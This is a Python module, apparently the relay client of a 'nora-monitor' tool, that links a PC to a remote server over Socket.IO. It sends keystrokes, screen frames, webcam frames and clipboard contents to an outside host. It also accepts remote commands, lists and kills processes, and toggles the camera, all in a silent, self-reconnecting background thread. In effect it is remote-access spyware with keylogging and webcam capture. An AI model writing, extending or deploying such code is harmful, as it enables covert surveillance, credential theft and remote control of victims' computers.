"""
Connects the nora-monitor to the relay server as a Socket.IO client.

Set NORA_RELAY env var to the relay URL (default: https://mon.eclipselivecam.online).
The PC's hostname is used as the agent name; override with NORA_NAME.
"""

import os
import platform
import socket
import threading
import socketio

RELAY_URL = os.environ.get("NORA_RELAY", "https://mon.eclipselivecam.online")
AGENT_NAME = os.environ.get("NORA_NAME", "") or platform.node() or socket.gethostname() or "agent"

_sio = None
_controller = None
_recorder = None
_camera = None
_lock = threading.Lock()


def init(controller_fn, recorder, camera):
    global _controller, _recorder, _camera
    _controller = controller_fn
    _recorder = recorder
    _camera = camera


def _emit(event, data):
    try:
        if _sio and _sio.connected:
            _sio.emit(event, data)
    except Exception:
        pass


def broadcast_frame(b64):      _emit("frame",        {"data": b64})
def broadcast_key(char):       _emit("key",          {"char": char})
def broadcast_camera(b64):     _emit("camera_frame", {"data": b64})
def broadcast_clipboard(text): _emit("clipboard",    {"text": text})
def broadcast_ngrok_url(url):  _emit("ngrok_url",    {"url": url})


def _connect_loop():
    global _sio
    sio = socketio.Client(
        reconnection=True,
        reconnection_attempts=0,
        reconnection_delay=2,
        reconnection_delay_max=30,
        logger=False,
        engineio_logger=False,
    )
    with _lock:
        _sio = sio

    @sio.on("connect")
    def _on_connect():
        sio.emit("register", {"name": AGENT_NAME})

    @sio.on("command")
    def _on_command(data):
        if _controller:
            try: _controller(data)
            except Exception: pass

    @sio.on("get_processes")
    def _on_get_processes(data):
        try:
            import processes as proc
            procs = proc.get_processes()
            sio.emit("processes_result", {
                "processes": procs,
                "_requester": data.get("_requester"),
            })
        except Exception:
            pass

    @sio.on("kill_process")
    def _on_kill(data):
        try:
            import processes as proc
            proc.kill_process(int(data.get("pid", 0)))
        except Exception:
            pass

    @sio.on("camera_on")
    def _on_cam_on(_data=None):
        if _camera:
            try: _camera.start()
            except Exception: pass

    @sio.on("camera_off")
    def _on_cam_off(_data=None):
        if _camera:
            try: _camera.stop()
            except Exception: pass

    sio.connect(RELAY_URL, transports=["polling", "websocket"])
    sio.wait()


def run():
    """Start the relay client in a background daemon thread."""
    t = threading.Thread(target=_connect_loop, daemon=True, name="relay-client")
    t.start()
